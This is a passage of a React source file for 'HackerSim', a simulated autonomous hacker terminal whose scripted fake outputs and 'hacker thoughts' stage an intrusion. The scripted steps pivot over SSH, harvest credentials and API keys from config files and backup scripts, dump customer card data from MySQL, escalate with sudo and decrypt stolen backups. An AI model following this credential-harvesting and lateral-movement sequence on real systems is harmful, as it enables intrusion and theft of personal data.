          "The authenticity of host '192.168.1.100 (192.168.1.100)' can't be established.\nED25519 key fingerprint is SHA256:HUHFdghj76tGFhjkKJHG76tghjkUYTfghjkUYTfghjk.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.1.100' (ED25519) to the list of known hosts.\nWelcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nLast login: Thu Mar 20 23:45:12 2025 from 192.168.1.1\nroot@server:~#",
        current_thought:
          "Successfully pivoted to the server machine using the SSH key we found. Now we have root access on both the desktop and server machines.",
      }
    }

    if (lastCommand.includes("ssh -i /root/.ssh/id_rsa root@192.168.1.100") && lastOutput.includes("root@server")) {
      return {
        current_command: "root@server:~# ls -la /var/www/html/",
        current_output:
          "total 48\ndrwxr-xr-x 6 www-data www-data 4096 Mar 20 22:15 .\ndrwxr-xr-x 3 root     root     4096 Mar 20 21:30 ..\ndrwxr-xr-x 2 www-data www-data 4096 Mar 20 22:15 admin\n-rw-r--r-- 1 www-data www-data 8192 Mar 20 22:15 config.php\ndrwxr-xr-x 2 www-data www-data 4096 Mar 20 22:15 css\n-rw-r--r-- 1 www-data www-data 5432 Mar 20 22:15 index.php\ndrwxr-xr-x 2 www-data www-data 4096 Mar 20 22:15 js\n-rw-r--r-- 1 www-data www-data 3217 Mar 20 22:15 login.php\ndrwxr-xr-x 2 www-data www-data 4096 Mar 20 22:15 uploads",
        current_thought:
          "The server also has a web application with an admin section. Let me check the config file for any sensitive information.",
      }
    }

    if (lastCommand.includes("ls -la /var/www/html/") && lastOutput.includes("config.php")) {
      return {
        current_command: "root@server:~# cat /var/www/html/config.php",
        current_output:
          "<?php\n// Database configuration\n$db_host = 'localhost';\n$db_user = 'root';\n$db_pass = 'SuperSecretPassword123!';\n$db_name = 'company_data';\n\n// API keys\n$api_keys = array(\n  'stripe' => 'sk_live_51KjLmKJHGfhjkJHGfhjkJHGfhjkJHGfhjkJHGfhjkJHG',\n  'aws' => 'AKIAIOSFODNN7EXAMPLE/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',\n  'mailchimp' => '8d3a5f8e3cc35d7654e9712e47c8c245-us14'\n);\n\n// JWT secret\n$jwt_secret = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9';\n\n// Connect to database\n$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);\nif ($conn->connect_error) {\n  die(\"Connection failed: \" . $conn->connect_error);\n}\n?>",
        current_thought:
          "Jackpot! Found database credentials, API keys for Stripe, AWS, and Mailchimp, and a JWT secret. This is highly sensitive information that could be used for further attacks.",
      }
    }

    if (lastCommand.includes("cat /var/www/html/config.php") && lastOutput.includes("API keys")) {
      return {
        current_command: "root@server:~# mysql -u root -p'SuperSecretPassword123!' -e \"SHOW DATABASES;\"",
        current_output:
          "mysql: [Warning] Using a password on the command line interface can be insecure.\nDatabase\ninformation_schema\ncompany_data\nmysql\nperformance_schema\nsys",
        current_thought:
          "Successfully connected to MySQL with the password from the config file. Let's explore the company_data database.",
      }
    }

    if (lastCommand.includes("mysql -u root") && lastOutput.includes("company_data")) {
      return {
        current_command:
          "root@server:~# mysql -u root -p'SuperSecretPassword123!' -e \"USE company_data; SHOW TABLES;\"",
        current_output:
          "mysql: [Warning] Using a password on the command line interface can be insecure.\nTables_in_company_data\ncustomers\nemployees\nfinancial_records\nproducts",
        current_thought:
          "The company_data database has several tables including customers, employees, financial_records, and products. Let me check the customers table first.",
      }
    }

    if (lastCommand.includes("SHOW TABLES") && lastOutput.includes("customers")) {
      return {
        current_command:
          "root@server:~# mysql -u root -p'SuperSecretPassword123!' -e \"USE company_data; SELECT * FROM customers LIMIT 5;\"",
        current_output:
          "mysql: [Warning] Using a password on the command line interface can be insecure.\nid\tname\temail\tphone\tcredit_card\taddress\n1\tJohn Smith\tjohn.smith@example.com\t555-123-4567\t4532015112830366\t123 Main St, Anytown, USA\n2\tJane Doe\tjane.doe@example.com\t555-987-6543\t4716253841259632\t456 Oak Ave, Somewhere, USA\n3\tBob Johnson\tbob.johnson@example.com\t555-555-5555\t5423198645781452\t789 Pine Rd, Nowhere, USA\n4\tAlice Williams\talice.williams@example.com\t555-246-8135\t6011456789123456\t321 Elm St, Anywhere, USA\n5\tCharlie Brown\tcharlie.brown@example.com\t555-369-2580\t3714496353984210\t654 Maple Dr, Everywhere, USA",
        current_thought:
          "Found customer data including names, email addresses, phone numbers, credit card numbers, and addresses. This is a serious data breach with PII (Personally Identifiable Information) and financial data.",
      }
    }

    if (lastCommand.includes("SELECT * FROM customers") && lastOutput.includes("credit_card")) {
      return {
        current_command: 'root@server:~# grep -r "password" /etc/ 2>/dev/null | grep -v "#" | head -n 10',
        current_output:
          "/etc/mysql/debian.cnf:password = SuperSecretPassword123!\n/etc/phpmyadmin/config-db.php:$dbpass='phpmyadmin456';\n/etc/postfix/sasl_passwd:smtp.gmail.com admin@company.com:EmailPassword789\n/etc/apache2/sites-available/000-default.conf:    SetEnv DB_PASSWORD \"SuperSecretPassword123!\"",
        current_thought:
          "Found more passwords in configuration files. Let me check if there are any interesting cron jobs that might be running with elevated privileges.",
      }
    }

    if (lastCommand.includes('grep -r "password"') && lastOutput.includes("postfix")) {
      return {
        current_command: "root@server:~# crontab -l",
        current_output:
          "# m h  dom mon dow   command\n0 0 * * * /root/scripts/backup.sh\n0 * * * * /root/scripts/monitor.sh\n30 1 * * * /root/scripts/update_system.sh",
        current_thought: "Found some scheduled scripts in the root crontab. Let me check what these scripts do.",
      }
    }

    if (lastCommand.includes("crontab -l") && lastOutput.includes("/root/scripts/")) {
      return {
        current_command: "root@server:~# ls -la /root/scripts/",
        current_output:
          "total 24\ndrwxr-xr-x 2 root root 4096 Mar 20 22:30 .\ndrwx------ 6 root root 4096 Mar 21 01:30 ..\n-rwxr-xr-x 1 root root  512 Mar 20 22:30 backup.sh\n-rwxr-xr-x 1 root root  256 Mar 20 22:30 monitor.sh\n-rwxr-xr-x 1 root root  384 Mar 20 22:30 update_system.sh",
        current_thought:
          "Let me check the backup script to see if it contains any interesting information or if it's backing up sensitive data.",
      }
    }

    if (lastCommand.includes("ls -la /root/scripts/") && lastOutput.includes("backup.sh")) {
      return {
        current_command: "root@server:~# cat /root/scripts/backup.sh",
        current_output:
          "#!/bin/bash\n\n# Backup script for server data\n\nDATE=$(date +%Y%m%d)\nBACKUP_DIR=/var/backups/server\nREMOTE_SERVER=backup.company.com\nREMOTE_USER=backup\nREMOTE_PASS=BackupPass321!\n\n# Create backup of databases\nmysqldump -u root -p'SuperSecretPassword123!' --all-databases > $BACKUP_DIR/databases_$DATE.sql\n\n# Create backup of web files\ntar -czf $BACKUP_DIR/www_$DATE.tar.gz /var/www/html\n\n# Upload to remote server\nftp -n $REMOTE_SERVER << EOF\nuser $REMOTE_USER $REMOTE_PASS\ncd /backups\nput $BACKUP_DIR/databases_$DATE.sql\nput $BACKUP_DIR/www_$DATE.tar.gz\nbye\nEOF\n\n# Clean up old backups (keep last 7 days)\nfind $BACKUP_DIR -type f -mtime +7 -delete",
        current_thought:
          "The backup script contains credentials for the backup server and is creating backups of all databases and web files. It's using plain FTP which is insecure. This gives us access to yet another system - the backup server.",
      }
    }

    if (lastCommand.includes("cat /root/scripts/backup.sh") && lastOutput.includes("REMOTE_PASS")) {
      return {
        current_command: "root@server:~# ping -c 1 backup.company.com",
        current_output:
          "PING backup.company.com (192.168.2.10) 56(84) bytes of data.\n64 bytes from backup.company.com (192.168.2.10): icmp_seq=1 ttl=64 time=1.24 ms\n\n--- backup.company.com ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.235/1.235/1.235/0.000 ms",
        current_thought:
          "The backup server is on a different subnet (192.168.2.10). This suggests there might be more networks to explore beyond the current one.",
      }
    }

    if (lastCommand.includes("ping -c 1 backup.company.com") && lastOutput.includes("192.168.2.10")) {
      return {
        current_command: "root@server:~# ip route",
        current_output:
          "default via 192.168.1.1 dev eth0 proto dhcp src 192.168.1.100 metric 100\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100\n192.168.2.0/24 dev eth1 proto kernel scope link src 192.168.2.1",
        current_thought:
          "The server has two network interfaces: eth0 connected to the 192.168.1.0/24 network and eth1 connected to the 192.168.2.0/24 network. This server is acting as a gateway between the two networks.",
      }
    }

    if (lastCommand.includes("ip route") && lastOutput.includes("192.168.2.0/24")) {
      return {
        current_command: "root@server:~# nmap -sP 192.168.2.0/24",
        current_output:
          "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for server.local (192.168.2.1)\nHost is up (0.000088s latency).\nNmap scan report for backup.company.com (192.168.2.10)\nHost is up (0.00045s latency).\nNmap scan report for fileserver.company.com (192.168.2.20)\nHost is up (0.00052s latency).\nNmap scan report for intranet.company.com (192.168.2.30)\nHost is up (0.00061s latency).\nNmap scan report for 192.168.2.100\nHost is up (0.00073s latency).\nNmap done: 256 IP addresses (5 hosts up) scanned in 2.96 seconds",
        current_thought:
          "Found several hosts on the second network: a backup server, a file server, an intranet server, and another unknown host. We now have access to an entirely new network segment.",
      }
    }

    if (lastCommand.includes("nmap -sP 192.168.2.0/24") && lastOutput.includes("fileserver")) {
      return {
        current_command: "root@server:~# ftp backup.company.com",
        current_output:
          "Connected to backup.company.com.\n220 ProFTPD Server (Backup Server) [backup.company.com]\nName (backup.company.com:root): backup\n331 Password required for backup\nPassword: BackupPass321!\n230 User backup logged in\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp>",
        current_thought:
          "Successfully connected to the backup server using the credentials from the backup script. Now I can explore the files on this server.",
      }
    }

    if (lastCommand.includes("ftp backup.company.com") && lastOutput.includes("User backup logged in")) {
      return {
        current_command: "ftp> ls -la",
        current_output:
          "200 PORT command successful\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   4 backup  backup      4096 Mar 21 00:00 .\ndrwxr-xr-x   3 root    root        4096 Mar 20 21:00 ..\ndrwxr-xr-x   2 backup  backup      4096 Mar 21 00:00 backups\ndrwxr-xr-x   2 backup  backup      4096 Mar 20 21:00 logs\n-rw-r--r--   1 backup  backup       512 Mar 20 21:00 README.txt\n226 Transfer complete",
        current_thought:
          "Found a backups directory, a logs directory, and a README.txt file. Let me check the README file first.",
      }
    }

    if (lastCommand.includes("ftp> ls -la") && lastOutput.includes("README.txt")) {
      return {
        current_command: "ftp> get README.txt",
        current_output:
          "local: README.txt remote: README.txt\n200 PORT command successful\n150 Opening BINARY mode data connection for README.txt (512 bytes)\n226 Transfer complete\n512 bytes received in 0.00 secs (5.1234 MB/s)",
        current_thought: "Downloaded the README.txt file. Let me check its contents.",
      }
    }

    if (lastCommand.includes("ftp> get README.txt") && lastOutput.includes("Transfer complete")) {
      return {
        current_command: "ftp> bye",
        current_output: "221 Goodbye.",
        current_thought: "Disconnected from the FTP server. Now let me read the README file.",
      }
    }

    if (lastCommand === "ftp> bye" && lastOutput.includes("Goodbye")) {
      return {
        current_command: "root@server:~# cat README.txt",
        current_output:
          "BACKUP SERVER INFORMATION\n\nThis server is used for storing backups of all company systems.\n\nAccess Information:\n- FTP: backup/BackupPass321!\n- SSH: admin/AdminPass987!\n\nBackup Schedule:\n- Daily: All databases and web files\n- Weekly: Full system backups\n- Monthly: Archive to tape\n\nFor any issues, contact the IT department at it@company.com\n\nNOTE: The encryption key for sensitive backups is stored in /etc/backup_encryption.key on the main server.",
        current_thought:
          "Found SSH credentials for the backup server in the README file. Also learned about the backup schedule and that there's an encryption key for sensitive backups on the main server.",
      }
    }

    if (lastCommand.includes("cat README.txt") && lastOutput.includes("SSH: admin/AdminPass987!")) {
      return {
        current_command: "root@server:~# cat /etc/backup_encryption.key",
        current_output:
          "-----BEGIN ENCRYPTION KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDJQvn2Dq2w9rky\nJHVk+Q9VOzBp0BnC+OxCMfHxUc2AJtCM4BLtANX1YpOxwVRx5Fz4gOe7QYxqDKlM\nCXVN6e1Zj0TtBBOZ5vxJ9wOQWnWKFX5Jh5kUPAZ5QUQ2l1+u5lQUQGg6CuUKxNPy\nYKOBCuGvdQMKFBzBD0pA5NcRJqsxlwvoKTaT+tgGfUbQYcIiLJ1JsgyiQgKdRKpQ\n...[TRUNCATED]...\nKJHGfhjkJHGfhjkJHGfhjkJHGfhjkJHGfhjkJHGfhjkJHGfhjkJHGfhjkJHGfhjk\n-----END ENCRYPTION KEY-----",
        current_thought:
          "Found the encryption key for sensitive backups. This could be used to decrypt any encrypted backup files we find.",
      }
    }

    if (lastCommand.includes("cat /etc/backup_encryption.key") && lastOutput.includes("ENCRYPTION KEY")) {
      return {
        current_command: "root@server:~# ssh admin@backup.company.com",
        current_output:
          "admin@backup.company.com's password: AdminPass987!\nWelcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nLast login: Thu Mar 20 23:30:15 2025 from 192.168.2.1\nadmin@backup:~$",
        current_thought:
          "Successfully logged into the backup server via SSH using the credentials from the README file. Now I have access to three machines: the desktop, the server, and the backup server.",
      }
    }

    if (lastCommand.includes("ssh admin@backup.company.com") && lastOutput.includes("admin@backup")) {
      return {
        current_command: "admin@backup:~$ sudo -l",
        current_output:
          "Matching Defaults entries for admin on backup:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser admin may run the following commands on backup:\n    (ALL : ALL) ALL",
        current_thought:
          "The admin user has full sudo privileges on the backup server. I can now access everything on this system as well.",
      }
    }

    if (lastCommand.includes("sudo -l") && lastOutput.includes("(ALL : ALL) ALL")) {
      return {
        current_command: "admin@backup:~$ sudo su -",
        current_output: "root@backup:~#",
        current_thought:
          "Switched to the root user on the backup server. Now I have complete control over this system.",
      }
    }

    if (lastCommand === "admin@backup:~$ sudo su -" && lastOutput.includes("root@backup")) {
      return {
        current_command: "root@backup:~# ls -la /backups/",
        current_output:
          "total 1028084\ndrwxr-xr-x 2 backup backup      4096 Mar 21 00:00 .\ndrwxr-xr-x 4 backup backup      4096 Mar 21 00:00 ..\n-rw-r--r-- 1 backup backup  52428800 Mar 21 00:00 databases_20250321.sql\n-rw-r--r-- 1 backup backup  52428800 Mar 20 00:00 databases_20250320.sql\n-rw-r--r-- 1 backup backup  52428800 Mar 19 00:00 databases_20250319.sql\n-rw-r--r-- 1 backup backup  31457280 Mar 21 00:00 www_20250321.tar.gz\n-rw-r--r-- 1 backup backup  31457280 Mar 20 00:00 www_20250320.tar.gz\n-rw-r--r-- 1 backup backup  31457280 Mar 19 00:00 www_20250319.tar.gz\n-rw-r--r-- 1 backup backup 209715200 Mar 17 00:00 full_backup_20250317.tar.gz.enc\n-rw-r--r-- 1 backup backup 209715200 Mar 10 00:00 full_backup_20250310.tar.gz.enc\n-rw-r--r-- 1 backup backup 209715200 Mar 03 00:00 full_backup_20250303.tar.gz.enc\n-rw-r--r-- 1 backup backup 209715200 Feb 25 00:00 full_backup_20250225.tar.gz.enc",
        current_thought:
          "Found daily database and web file backups, as well as weekly full system backups that are encrypted. I could use the encryption key we found earlier to decrypt these files.",
      }
    }

    // Generate a custom output based on the command
    function generateCustomOutput(command) {
      if (command.toLowerCase().includes("ls")) {
        return "total 32\ndrwxr-xr-x 4 root root 4096 Mar 21 01:45 .\ndrwxr-xr-x 22 root root 4096 Mar 20 23:15 ..\n-rw-r--r-- 1 root root  220 Mar 20 23:15 .bash_logout\n-rw-r--r-- 1 root root 3771 Mar 20 23:15 .bashrc\ndrwx------ 2 root root 4096 Mar 21 01:22 .cache\n-rw-r--r-- 1 root root  807 Mar 20 23:15 .profile\ndrwxr-xr-x 2 root root 4096 Mar 21 01:45 scripts"
      } else if (command.toLowerCase().includes("cat")) {
        return "File contents:\n\nThis is a sample file that would be displayed when using the 'cat' command.\nThe actual content would depend on the specific file being viewed.\n\nEnd of file."
      } else if (command.toLowerCase().includes("grep")) {
        return "line 15: matched text here\nline 42: another match here\nline 108: final match here"
      } else if (command.toLowerCase().includes("find")) {
        return "./config/settings.json\n./logs/access.log\n./data/users.db\n./scripts/backup.sh"
      } else if (command.toLowerCase().includes("nmap")) {
        return "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for target-host (192.168.1.x)\nHost is up (0.0045s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1\n80/tcp open  http    Apache httpd 2.4.52\n443/tcp open  https   Apache httpd 2.4.52\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.85 seconds"
      } else {
        return "Command executed successfully.\nOutput would vary based on the specific command and system state."
      }
    }

    // If we've gone through all the steps or don't recognize the last command
    // Return a continuation of the penetration test with a new command
    return {
      current_command:
        "root@backup:~# openssl enc -d -aes-256-cbc -in /backups/full_backup_20250317.tar.gz.enc -out /tmp/decrypted_backup.tar.gz -pass file:/tmp/encryption.key",
      current_output: "*** WARNING : deprecated key derivation used.\nUsing -iter or -pbkdf2 would be better.",
      current_thought:
        "Attempting to decrypt the most recent full backup using the encryption key we found. The warning about deprecated key derivation is just informational and doesn't affect the decryption process.",
    }
  }

  const submitGodmodeCommand = () => {
    if (!godmodeInputRef.current) return

    const command = godmodeInputRef.current.value.trim()
    if (command) {
      setGodmodeCommand(command)
      if (!isThoughtStreaming) {
        addGodModeThought(command)
      } else {
        setPendingGodModeCommand(command)
      }
      godmodeInputRef.current.value = ""
      updateApiStatus("GodMode command received. Influencing hacker's next action.")

      toast({
        title: "GodMode Command Received",
        description: "Your command will influence the hacker's next action.",
      })

      // Immediately trigger the next hacker action to respond to the GodMode command
      setTimeout(() => progressHackerSession(), 1000)
    }
  }

  const handleGodmodeKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault()
      submitGodmodeCommand()
    }
  }

  const toggleSound = () => {
    setSoundEnabled((prev) => !prev)
  }

  const toggleApiStatus = () => {
    setShowApiStatus((prev) => !prev)
  }

  return (
    <div className="p-4 lg:p-6 min-h-screen font-mono bg-[#0a0a0a] text-[#33ff33]">
      <div className="main-container flex flex-col h-screen p-5 box-border bg-gradient-to-br from-black to-[#0a0a0a] bg-fixed">
        <h1 className="text-[#00ff00] text-shadow-glow text-2xl md:text-3xl font-medium tracking-wider mb-4">
          HackerSim - Autonomous Hacker Terminal
        </h1>

        <div className="content-container flex flex-col md:flex-row flex-1 overflow-hidden gap-5">
          <div id="terminal-container" className="flex-1 md:flex-[2] flex flex-col min-w-0">
            <div
              ref={terminalRef}
              id="terminal"
              className="flex-grow bg-black/70 border border-[#33ff33]/50 p-4 shadow-[0_0_20px_rgba(51,255,51,0.2)] overflow-y-auto text-sm whitespace-pre-wrap break-words overflow-x-hidden rounded-md backdrop-blur-md"
            ></div>
          </div>

          <div id="thought-container" className="flex-1 flex flex-col min-w-0">
            <h2 className="text-[#00ff00] text-shadow-glow text-xl font-medium tracking-wider mb-4">Hacker Thoughts</h2>
            <div
              ref={thoughtLogRef}
              id="thought-log"
              className="flex-grow bg-black/70 border border-[#33ff33]/50 p-4 shadow-[0_0_20px_rgba(51,255,51,0.2)] overflow-y-auto text-sm whitespace-pre-wrap break-words overflow-x-hidden rounded-md backdrop-blur-md mb-4"
            ></div>

            <div id="godmode-container" className="flex flex-col">
              <Textarea
                ref={godmodeInputRef}
                id="godmode-input"
                placeholder="Enter a GodMode command to direct the hacker's next action..."
                className="bg-[#001f1f]/70 text-[#00ffff] border border-[#00ffff]/50 p-3 mb-3 resize-y w-full font-mono text-sm rounded-md transition-all duration-300 focus:shadow-[0_0_10px_rgba(0,255,255,0.5)] focus:outline-none backdrop-blur-md"
                rows={3}
                onKeyDown={handleGodmodeKeyDown}
              />
              <Button
                id="godmode-submit"
                onClick={submitGodmodeCommand}
                className="bg-[#00ffff]/20 text-[#00ffff] border border-[#00ffff]/50 p-2 cursor-pointer font-mono font-bold rounded-md transition-all duration-300 hover:bg-[#00ffff]/40 hover:shadow-[0_0_10px_rgba(0,255,255,0.5)] backdrop-blur-md"
              >
                Submit GodMode Command
              </Button>
            </div>
          </div>
        </div>

        {showApiStatus && (
          <div
            ref={apiStatusRef}
            id="api-status"
            className="bg-black/70 text-[#00ffff] p-3 text-xs h-[100px] overflow-y-auto mt-4 rounded-md border border-[#00ffff]/50 backdrop-blur-md"
          ></div>
        )}
      </div>

      <div id="control-buttons" className="fixed top-5 right-5 flex gap-4">
        <Button
          id="sound-toggle"
          onClick={toggleSound}
          className="bg-[#33ff33]/20 text-[#33ff33] border border-[#33ff33]/50 px-3 py-2 text-sm cursor-pointer font-mono font-bold rounded-md transition-all duration-300 hover:bg-[#33ff33]/40 hover:shadow-[0_0_10px_rgba(51,255,51,0.5)] backdrop-blur-md"
        >
          {soundEnabled ? "Mute Sound" : "Unmute Sound"}
        </Button>
        <Button
          id="api-status-toggle"
          onClick={toggleApiStatus}
          className="bg-gray-800/20 text-white border border-white/50 px-3 py-2 text-sm cursor-pointer font-mono font-bold rounded-md transition-all duration-300 hover:bg-white/20 hover:shadow-[0_0_10px_rgba(255,255,255,0.5)] backdrop-blur-md"
        >
          {showApiStatus ? "Hide Debug Log" : "Show Debug Log"}
        </Button>
      </div>

      {/* Audio elements for typing sounds */}
      <audio
        id="typing-sound-1"
        src="https://cdn.pixabay.com/download/audio/2022/03/24/audio_ef3fa634de.mp3?filename=keyboard-spacebar-hit-101812.mp3"
        preload="auto"
      ></audio>
      <audio
        id="typing-sound-2"
        src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_bca2811b06.mp3?filename=keyboard5-88069.mp3"
        preload="auto"
      ></audio>
    </div>
  )
}

